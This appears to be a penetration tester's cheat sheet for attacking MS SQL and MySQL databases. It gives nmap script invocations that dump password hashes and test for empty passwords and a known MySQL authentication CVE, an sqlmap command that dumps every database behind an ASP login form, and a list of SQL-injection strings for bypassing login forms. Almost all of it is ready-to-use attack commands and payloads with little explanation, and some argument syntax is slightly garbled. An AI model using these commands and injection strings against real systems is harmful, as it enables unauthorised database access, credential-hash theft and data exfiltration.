# **MS SQL**

  

## nmap -vv -sV -Pn -p <> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa

x.x.x.x  
  

## nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

x.x.x.x  
  

## nmap -sV -Pn -vv -script=mysql* $ip -p 3306

  
  

## sqlmap -u '

[http://$ip/login-off.asp'](http://%24ip/login-off.asp')

## --method POST --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all

  
  
  
  
mysql -u root -p -h x.x.x.x  

##   
Common Injections for Login Forms:  
admin' --  
admin' #  
admin'/*  
' or 1=1--  
' or 1=1#  
' or 1=1/*  
') or '1'='1--  
') or ('1'='1—

  ![](Screenshots/752-1.png)

Show databases;  
use <database name>;  
show tables;  
select * from <table name>